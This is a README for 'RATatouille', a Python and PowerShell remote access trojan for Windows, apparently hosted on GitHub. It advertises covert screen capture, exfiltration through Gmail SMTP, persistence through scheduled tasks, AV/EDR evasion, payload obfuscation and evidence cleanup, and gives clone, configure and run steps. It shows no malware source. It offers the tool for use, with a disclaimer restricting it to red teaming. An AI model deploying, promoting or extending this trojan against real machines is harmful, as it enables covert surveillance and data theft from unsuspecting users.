# 🐀 RATatouille 

**"A little RAT that cooks up chaos."**

RATatouille is a stealthy, highly Evasive modular Python-based Remote Access Trojan (RAT) that exfiltrates data through Gmail using PowerShell-based surveillance on Windows systems. Designed for red team operations and controlled Penetration Testing assesments, this tool captures screen activity and transmits it as email attachments — no admin privileges required.

---

## 📌 Features

- 💽 Screen capture surveillance via PowerShell
- 📧 Data exfiltration through Gmail (SMTP)
- 🔀 Persistence using Windows Scheduled Tasks
- ❌ Requires no administrative privileges
- 🧱 Fully modular and easy to extend
- 🕵️ Highly Evasive (Tested in AV/EDR protected environments)
- 🐍 Written in Python 3.6+ with PowerShell integration
- In Test: Data Exfiltration via HTTP, Encrypted C2 Channel, Volume Shadow Copy. 
---

## 🐍 Requirements

- Python 3 or later
- Windows OS (for PowerShell execution)
- Required Python modules:
  - `pywin32` (if using behavioral triggers)
  - `subprocess`, `os`, `time` (standard)

---

## 🚀 Usage

> ⚠️ **Use in a virtual lab or ethical test environment only. Unauthorized use is prohibited.**

### Step 1: Clone the Repo

```bash
git clone https://github.com/Bidaoui4905/RATatouille.git
cd RATatouille
```

### Step 2: Configure `RATatouille.py`

Set your Gmail address and App Password in the config or directly in the script (`mail.ps1`).

Ensure target directories for screenshots exist (e.g., `Documents\\ScreenShot\\`).

### Step 3: Run the RAT

```bash
python RATatouille.py
```

Use the menu to:

- Take screenshots
- Exfiltrate via email
- Schedule persistence
- Clean up evidence
- Automate everything

---

## 🧠 Architecture

```
RATatouille.py
├── capture.py        # Screenshot logic
├── exfiltrate.py     # Email sending via PowerShell
├── persist.py        # Task scheduling
├── clean.py          # File cleanup
├── obfuscate.py      # Payload obfuscation 
└── utils/            # PowerShell runners and helpers
```

---

## 📝 Disclaimer

This tool is strictly for:

- Red Team operations
- Educational purposes
- Ethical hacking
- Malware behavior research in secure environments

**Do not use this tool to compromise systems without explicit authorization.**

---

## 📣 Credits

- Inspired by: Viralmaniar/PowerShell-RAT


---

## 🦀 RATatouille

**"Cooking up chaos — one login page at a time."**